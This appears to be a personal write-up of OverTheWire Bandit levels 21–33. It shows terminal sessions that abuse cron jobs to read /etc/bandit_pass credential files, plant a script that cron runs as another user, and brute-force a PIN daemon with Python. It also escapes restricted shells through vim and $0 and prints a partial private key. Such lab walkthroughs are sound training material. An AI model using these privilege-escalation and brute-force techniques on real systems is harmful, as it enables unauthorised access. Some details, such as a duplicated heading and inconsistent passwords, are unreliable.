---
title: "OverTheWire Wargames: Bandit Level 21-33"
date: 2022-11-12 20:13:00 +0100
categories: [Wargames, Bandit]
tags: [bandit, linux, overthewire, wargames, commandline]     # TAG names should always be lowercase
---


My Write-up of the infamous [Bandit](https://overthewire.org/wargames/bandit/) challenges, that "can help you to learn and practice security concepts in the form of fun-filled games."

# General
# General
<hr>

Usernames have the following format: bandit\<level>, so bandit0, bandit1 ...

To connect the following command is used:
```bash
$ ssh bandit<level>@bandit.labs.overthewire.org -p 2220
```
Then you will be asked to give the passwords, which you will find within each level.

Complex commands will be explained for each level, while the general commands can be found in a table at the end of the write-up.

## Level 21

<hr>

- Username: bandit21 <br>
- Password: NvEJF70Vjkdd1tpsrdKEF011h9V11Bcq
- Task: A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

We need to look into the /etc/cron.d directory and find an interesting cronjob called cronjob_bandit22. This simply pastes the password file into a tmp directory, which we have access to so we simply have to get the password from that dir:

```bash
bandit21@bandit:~$ ls /etc/cron.d
cronjob_bandit15_root  cronjob_bandit22  cronjob_bandit24       e2scrub_all  sysstat
cronjob_bandit17_root  cronjob_bandit23  cronjob_bandit25_root  otw-tmp-dir
bandit21@bandit:~$ ls -la /etc/cron.d
total 48
drwxr-xr-x   2 root root 4096 Sep  1 06:30 .
drwxr-xr-x 110 root root 4096 Oct 21 23:52 ..
-rw-r--r--   1 root root   62 Sep  1 06:30 cronjob_bandit15_root
-rw-r--r--   1 root root   62 Sep  1 06:30 cronjob_bandit17_root
-rw-r--r--   1 root root  120 Sep  1 06:30 cronjob_bandit22
-rw-r--r--   1 root root  122 Sep  1 06:30 cronjob_bandit23
-rw-r--r--   1 root root  120 Sep  1 06:30 cronjob_bandit24
-rw-r--r--   1 root root   62 Sep  1 06:30 cronjob_bandit25_root
-rw-r--r--   1 root root  201 Jan  8  2022 e2scrub_all
-rwx------   1 root root   52 Sep  1 06:30 otw-tmp-dir
-rw-r--r--   1 root root  102 Mar 23  2022 .placeholder
-rw-r--r--   1 root root  396 Feb  2  2021 sysstat
bandit21@bandit:~$ cat /etc/cron.d/cronjob_bandit22
@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
bandit21@bandit:~$ cat /usr/bin/cronjob_bandit22.sh 
#!/bin/bash
chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
bandit21@bandit:~$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
WdDozAdTM2z9DiFEQ2mGlwngMfj4EZff
```


## Level 21

<hr>

- Username: bandit21 <br>
- Password: WdDozAdTM2z9DiFEQ2mGlwngMfj4EZff
- Task:	A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed. 
  * NOTE: Looking at shell scripts written by other people is a very useful skill. The script for this level is intentionally made easy to read. If you are having problems understanding what it does, try executing it to see the debug information it prints.


```bash
bandit22@bandit:~$ ls /etc/cron.d
cronjob_bandit15_root  cronjob_bandit22  cronjob_bandit24       e2scrub_all  sysstat
cronjob_bandit17_root  cronjob_bandit23  cronjob_bandit25_root  otw-tmp-dir
bandit22@bandit:~$ cat /etc/cron.d/cronjob_bandit23 
@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
bandit22@bandit:~$ cat /usr/bin/cronjob_bandit23.sh 
#!/bin/bash

myname=$(whoami)
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)

echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"

cat /etc/bandit_pass/$myname > /tmp/$mytarget
bandit22@bandit:~$ echo I am user $myname | md5sum | cut -d ' ' -f 1
7db97df393f40ad1691b6e1fb03d53eb
bandit22@bandit:~$ echo I am user bandit23 | md5sum | cut -d ' ' -f 1
8ca319486bfbbc3663ea0fbe81326349
bandit22@bandit:~$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G

```



## Level 23

<hr>

- Username: bandit23 <br>
- Password: QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
- Task:	A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.	
	* NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!
	* NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

We see that the script /usr/bin/cronjob_bandit24.sh first executes and then removes all files in the directory /var/spool/$myname/foo. So I put a script in the directory that outputs the password to our own tmp dir. 
Remember to set the directory and file permissions, so that this process is able to execute and write to the directory/file! 

```bash
bandit23@bandit:~$ ls /etc/cron.d
cronjob_bandit15_root  cronjob_bandit22  cronjob_bandit24       e2scrub_all  sysstat
cronjob_bandit17_root  cronjob_bandit23  cronjob_bandit25_root  otw-tmp-dir
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh 
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
bandit23@bandit:~$ mkdir /tmp/sve110
bandit23@bandit:~$ cd /tmp/sve110
bandit23@bandit:/tmp/sve110$ nano pass.sh
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/sve110/pass_file

bandit23@bandit:/tmp/sve110$ chmod +rwx pass.sh 
bandit23@bandit:/tmp/sve110$ chmod 777 pass.sh
bandit23@bandit:/tmp/sve110$ chmod 777 /tmp/sve110
bandit23@bandit:/tmp/sve110$ touch pass_file
bandit23@bandit:/tmp/sve110$ chmod 777 pass_file
bandit23@bandit:/tmp/sve110$ cp pass.sh /var/spool/bandit24/foo/pass.sh
bandit23@bandit:/tmp/sve110$ cat pass_file
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar

```


## Level 24

<hr>

- Username: bandit24 <br>
- Password: VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
- Task: A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.


This task requires some python/bash/scripting skills. 
I used python to create a script that connects to the port and sends all combinations together with the password:

```python
    1 	import socket
    2 	
    3 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    4 	s.connect(('localhost', 30002)); s.recv(1024)
    5 	
    6 	for i in range(10):
    7 	        for j in range(10):
    8 	                for k in range(10):
    9 	                        for l in range(10):
   10 	                                pin=str(i)+str(j)+str(k)+str(l)
   11 	                                print("sending "+pin)
   12 	                                s.sendall(str.encode('VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar ' + pin +'\n'))
   13 	                                data = s.recv(1024).decode()
   14 	                                if not data.startswith('Wrong'):
   15 	                                        print('PIN '+pin+': '+data)
   16 	                                        exit()


```
```bash
bandit24@bandit:/tmp/tempkru$ python3 brute.py
sending 0000 
sending 0001 
sending 0002 
sending 0003 
sending 0004 
sending 0005 
sending 0006 
sending 0007 
sending 0008 
sending 0009 
sending 0010 
sending 0011 
sending 0012 
sending 0013 
sending 0014 
sending 0015 
sending 0016 
sending 0017 
sending 0018 
sending 0019 
sending 0020 
...
sending 1021
sending 1022
sending 1023
sending 1024
sending 1025
PIN 1025: Correct! 
The password of user bandit 25 is p7TaowMYrmu23018hiZh9UvD009hpx8d 
Exiting. 
```


## Level 25

<hr>

- Username: bandit25 <br>
- Password: p7TaowMYrmu23018hiZh9UvD009hpx8d
- Task: Logging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not /bin/bash, but something else. Find out what it is, how it works and how to break out of it.

```bash

bandit26@bandit:~$ ls 
bandit26.sshkey 
bandit26@bandit:~$ cat bandit26.sshkey 
—————BEGIN RSA PRIVATE KEY————— 
MllEpQIBAAKCAQEApis2AuoooEqeYWamtwX2k5z9uUIAf12F8VyXQqbv/LTr1wdW 
pTfaeRHXzrOYOa50e3GB/+W2+PReif+bPZ1zTYIXFwpk+DiHk1kmLOmoEW8HJuT9 
...
euPeaxUCgYEAntklXwBbokgdDup/u/3ms5Lb/bm22zDOCg2HrlWQCqKEkWkA06R5 
/Wwyqhp/wT18VXjxW0+W+DmewGdPHGQQ5fFdqgpuQpGUq24YZS8m66v5ANBwd76t 
IZdtF5HXs2S5CADTwniUS5mXIH0915gUkk+hOcH5JnPtsMCnAUM+BRY= 
—————END RSA PRIVATE KEY————— 
```

We have extracted the SSH key, but don't leave yet!
First we will have a look at what shell bandit26 is using, which we can extract from the passwd file:
```bash
bandit25@bandit:~$ cat /etc/passwd | grep bandit26
bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
bandit25@bandit:~$ cat /usr/bin/showtext 
#!/bin/sh
 
export TERM=linux

exec more ~/text.txt
exit 0

```
We see that there is a command called "more". To make it execute, the window of the shell needs to be very small, so literally, resize your shell window until you can barely see one or two lines. Then log in:
```
ssh -i ssh26.privatefile bandit26@bandit.labs.overthewire.org -p 2220
```
Now if you were successful, you should be loged in.
Now press "v" to start the vim editor then do the following in that window:
```bash
:set shell=/bin/bash 
:shell
```
Now a shell should have opened:

```bash
:shell 
bandit26@bandit:~$ ls 
bandit27-do text.txt 
bandit26@bandit:~$ cat /etc/bandit_pass/bandit26 
c7GvcKlw9mC7aUQaPx7nwFstuAIBw101 
```

Don't exit this shell yet!! You'll need it for the next task


## Level 26

<hr>

- Username: bandit26 <br>
- Password: c7GvcKlw9mC7aUQaPx7nwFstuAIBw1o1
- Task: Good job getting a shell! Now hurry and grab the password for bandit27!

```bash
bandit26@bandit:~$ ./bandit27-do 
Run a command as another user. 
 Example: ./bandit27-do id
bandit26@bandit:~$ ./bandit27-do cat/etc/bandit_pass/bandit27 
YnQpBuifNMas1hcUFk70ZmqkhUU2EuaS 
```


## Level 27

<hr>

- Username: bandit27 <br>
- Password: YnQpBuifNMas1hcUFk70ZmqkhUU2EuaS
- Task: There is a git repository at ssh://bandit27-git@localhost/home/bandit27-git/repo. The password for the user bandit27-git is the same as for the user bandit27. Clone the repository and find the password for the next level.

I received an error as follows:
```bash
bandit27@bandit:/tmp$ git clone ssh://bandit27-git@localhost/home/bandit27-git/repo.git
Cloning into 'repo'...
The authenticity of host 'localhost (127.0.0.1)' can´t be established.
ED25519 key fingerprint is SHA256:C2ihUBV7ihnV1wUXRb4RrEcLfXC5CXlhmAAM/urerLY.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Could not create directory '/home/bandit27/.ssh' (Permission denied).
Failed to add the host to the list of known hosts (/home/bandit27/.ssh/known_hosts).

                      This is an OverTheWire game server. 
            More information on http://www.overthewire.org/wargames

!!! You are trying to log into this SSH server on port 22, which is not intended.

bandit27-git@localhost: Permission denied (publickey).
fatal: Could not read from remote repository.

Please make sure you have the correct access rights
and the repository exists.
```
To fix it just add the port to localhost to the ssh command as follows:
```bash
bandit27@bandit:/tmp$ git clone ssh://bandit27-git@localhost:2220/home/bandit27-git/repo
bandit27@bandit:/tmp/banditkru$ ls 
repo 
bandit27@bandit:/tmp/banditkru$ cd repo/ 
bandit27@bandit:/tmp/banditkru/repo$ ls 
README 
bandit27@bandit:/tmp/banditkru/repo$ cat readme 
cat: readme: No such file or directory 
bandit27@bandit:/tmp/banditkru/repo$ cat README  
The password to the next level is: AVanL161y9rsbcJIsFHuw35rjaOM19nR 
```

## Level 28

<hr>

- Username: bandit28 <br>
- Password: AVanL161y9rsbcJIsFHuw35rjaOM19nR
- Task: There is a git repository at ssh://bandit28-git@localhost/home/bandit28-git/repo. The password for the user bandit28-git is the same as for the user bandit28.

Clone the repository and find the password for the next level.

```bash
bandit28@bandit:/tmp/banditkru2/repo$ git clone ssh://bandit28-git@localhost:2220/home/bandit28-git/repo
bandit28@bandit:/tmp/banditkru2/repo$ git log
commit 43032edb2fb868dea2ceda9cb3882b2c336c09ec (HEAD -> master, origin/master, origin/HEAD)
Author: Morla Porla <morla@overthewire.org>
Date:   Thu Sep 1 06:30:25 2022 +0000

    fix info leak

commit bdf3099fb1fb05faa29e80ea79d9db1e29d6c9b9
Author: Morla Porla <morla@overthewire.org>
Date:   Thu Sep 1 06:30:25 2022 +0000

    add missing data

commit 43d032b360b700e881e490fbbd2eee9eccd7919e
Author: Ben Dover <noone@overthewire.org>
Date:   Thu Sep 1 06:30:24 2022 +0000

    initial commit of README.md

bandit28@bandit:/tmp/banditkru2/repo$ git show bdf3099fb1fb05faa29e80ea79d9db1e29d6c9b9
commit bdf3099fb1fb05faa29e80ea79d9db1e29d6c9b9
Author: Morla Porla <morla@overthewire.org>
Date:   Thu Sep 1 06:30:25 2022 +0000

    add missing data

diff --git a/README.md b/README.md
index 7ba2d2f..b302105 100644
--- a/README.md
+++ b/README.md
@@ -4,5 +4,5 @@ Some notes for level29 of bandit.
 ## credentials
 
 - username: bandit29
-- password: <TBD>
+- password: tQKvmcwNYcFS6vmPHIUSI3ShmsrQZK8S
```


## Level 29

<hr>

- Username: bandit29 <br>
- Password: tQKvmcwNYcFS6vmPHIUSI3ShmsrQZK8S
- Task: There is a git repository at ssh://bandit29-git@localhost/home/bandit29-git/repo. The password for the user bandit29-git is the same as for the user bandit29. Clone the repository and find the password for the next level.

This time nothing interesting showed up when looking at the git log, so we try to look at branches:
```bash
bandit29@bandit:/tmp/banditkru3/repo$ git branch -a 
*master 
    remotes/origin/HEAD -> origin/master 
    remotes/origin/dev 
    remotes/origin/master 
    remotes/origin/sploits-dev 
bandit29@bandit:/tmp/banditkru3/repo$ git checkout dev 
Branch 'dev' set up to track remote branch 'dev' from 'origin'. 
Switched to a new branch 'dev' 
bandit2Ebandit:/tmp/banditkru3/repo$ ls 
code README.md 
bandit29@bandit:/tmp/banditkru3/repo$ cat code 
cat: code: Is a directory 
bandit29@bandit:/tmp/banditkru3/repo$ cd code 
bandit29@bandit:/tmp/banditkru3/repo/code$ ls 
gif2ascii.py 
bandit29@bandit:/tmp/banditkru3/repo/code$ cat gif2ascii.py 

bandit29@bandit:/tmp/banditkru3/repo/code$ cat README.md 
cat: README.md: No such file or directory 
bandit29@bandit:/tmp/banditkru3/repo/code$ cd .. 
bandit29@bandit:/tmp/banditkru3/repo$ cat README.md 
# Bandit Notes 
Some notes for bandit30 of bandit. 

## credentials 

- username: bandit30 
- password: xbhV3HpNGlTIdnjUrdAlPzc2L6y9EOnS 
```


## Level 30

<hr>

- Username: bandit30 <br>
- Password: xbhV3HpNGlTIdnjUrdAlPzc2L6y9EOnS
- Task: There is a git repository at ssh://bandit30-git@localhost/home/bandit30-git/repo. The password for the user bandit30-git is the same as for the user bandit30. Clone the repository and find the password for the next level.

This was a little tricky, as I didn't find the tag command in the documentation immediately.
```bash
bandit30@bandit:/tmp/banditkru4$ ls 
repo 
bandit30@bandit:/tmp/banditkru4$ cd repo 
bandit30@bandit:/tmp/banditkru4/repo$ ls 
README.md 
bandit30@bandit:/tmp/banditkru4/repo$ cat README.md 
just an epmty file ... muahaha 
bandit30@bandit:/tmp/banditkru4/repo$ git log 
commit a325f29e1cc26b0f0dc5f89b4348e389b408cc87 (HEAD -> master, origin/master, origin/HEAD)
Author: Ben Dover 
Date:   Thu sep 1 06:30:28 2022 +0000 

    initial commit of README.md 
bandit30@bandit:/tmp/banditkru4/repo$ git branch -a 
*master  
    remotes/origin/HEAD -> origin/master 
    remotes/origin/master 
bandit30@bandit:/tmp/banditkru4/repo$ git checkout master 
Already on 'master' 
Your branch is up to date with 'origin/master' . 
bandit30@bandit:/tmp/banditkru4/repo$ ls 
README.md 
bandit30@bandit:/tmp/banditkru4/repo$ git branch -a 
*master  
    remotes/origin/HEAD -> origin/master 
    remotes/origin/master 
bandit30@bandit:/tmp/banditkru4/repo$ git tag 
secret 
bandit30@bandit:/tmp/banditkru4/repo$ git show secret 
OoffzGDlzhAlerFJ2cAiz1D41JWIMhmt 
```


## Level 31

<hr>

- Username: bandit31 <br>
- Password: OoffzGDlzhAlerFJ2cAiz1D41JWIMhmt
- Task: There is a git repository at ssh://bandit31-git@localhost/home/bandit31-git/repo. The password for the user bandit31-git is the same as for the user bandit31.

Clone the repository and find the password for the next level.

```bash
bandit31@bandit/tmp/banditkru5/repo$ cat README.md 
This time your task is to push a file to the remote repository. 
Details: 
File name: key.txt 
Content: 'May I come in?' 
Branch: master 
```
Looks like we have to push this code:
```bash
bandit31@bandit/tmp/banditkru5/repo$ ls
key.txt README.md 
bandit31@bandit/tmp/banditkru5/repo$ cat key.txt 
May I come in? 
bandit31@bandit/tmp/banditkru5/repo$ git add -f key.txt 
bandit31@bandit/tmp/banditkru5/repo$ git commit -a  
Unable to create directory / home/ bandit31/.local/share/nano/: No such file or directory 
It is required for saving/ loading search history or cursor positions. 
[master cdce277] new commit 
1 file changed, 1 insertion(+) 
create mode 100644 key.txt 
...
```

```bash
bandit31@bandit/tmp/banditkru5/repo$ git push -u origin master 
The authenticity of host '[localhost]:2220 ([127.0.0.1]:2220)' can´t be established. 
ED25519 key fingerprint is SHA256 :C2ihUBV7ihnV1wUXRb4RrEcLfXC5CXlhmAAM/urerLY. 
This key is not known by any other names 
Are you sure you want to continue connecting (yes/no/ [fingerprint])? yes 
Could not create directory '/home/bandit31/.ssh' (Permission denied). 
Failed to add the host to the list of known hosts (/home/bandit31/.ssh/known_hosts). 
                         _                     _ _ _   
                        | |__   __ _ _ __   __| (_) |_ 
                        | '_ \ / _` | '_ \ / _` | | __|
                        | |_) | (_| | | | | (_| | | |_ 
                        |_.__/ \__,_|_| |_|\__,_|_|\__|

                    This is an OverTheWire game server. 
                More information on http://mw.overthewire.org/wargames 
bandit31-gitOlocalhost´s password: 
Enumerating objects: 8, done. 
Counting objects: 100% (8/8), done. 
Delta compression using up to 2 threads 
Compressing objects: 100% (4/4), done. 
Writing objects: 100% (6/6), 491 bytes | 491.00 KiB/s, done. 
Total 6 (delta 1), reused 0 (delta 0), pack-reused 0 
remote: ### Attempting to validate files ... ####
remote: 
remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo. 
remote: 
remote: Well done! Here is the password for the next level: 
remote: rmCBvG56y58BXzv98yZGd07ATVL5dW8y 
remote: 
remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo. 
remote: 
To ssh://localhost:2220/home/bandit31-git/repo 
! [remote rejected] master -> master (pre-receive hook declined) 
error: failed to push some refs to 'ssh://localhost:2220/home/bandit31-git/repo'
```

## Level 32

<hr>

- Username: bandit32 <br>
- Password: rmCBvG56y58BXzv98yZGd07ATVL5dW8y
- Task: After all this git stuff its time for another escape. Good luck!

```bash
WELCOME TO THE UPPERCASE SHELL 
>> ls
sh: 1: LS: not found
>> ls
sh: 1: LS: not found
>> man
sh: 1: MAN: not found
>> MAN
sh: 1: MAN: not found
>> 0$
$ ls
uppershell
$ cat /etc/bandit_pass/bandit32 
cat: /etc/bandit_pass/bandit32: Permission denied 
$ cat /etc/bandit_pass/bandit 33 
odH063fHiFqcWWJG9rLiLDtPm45KzUKy 
```
The 0$ command is a standard environment variable referencing shell, so by calling it we return to the normal shell again.

Finally, we also find a README and have a look:
```bash
$ cat README.txt 
Congratulations on solving the last level of this game! 
At this moment, there are no more levels to play in this game. However, we are constantly working on new levels and will most likely expand this game with more levels soon. 
Keep an eye out for an announcement on our usual communication channels! 
In the meantime, you could play some of our other wargames. 
If you have an idea for an awesome new level, please let us know! 
```


## Level 33

<hr>

- Username: bandit33 <br>
- Password: odH063fHiFqcWWJG9rLiLDtPm45KzUKy
- Task: At this moment, level 34 does not exist yet.


## All commands and their description
<hr>

Use [man](https://man7.org/linux/man-pages/index.html) pages to find explanations and usage information.

| Command | Description |
|---------|-------------|
|    git     |   version control system  |
| chmod | change the access permissions |
| echo | output information |

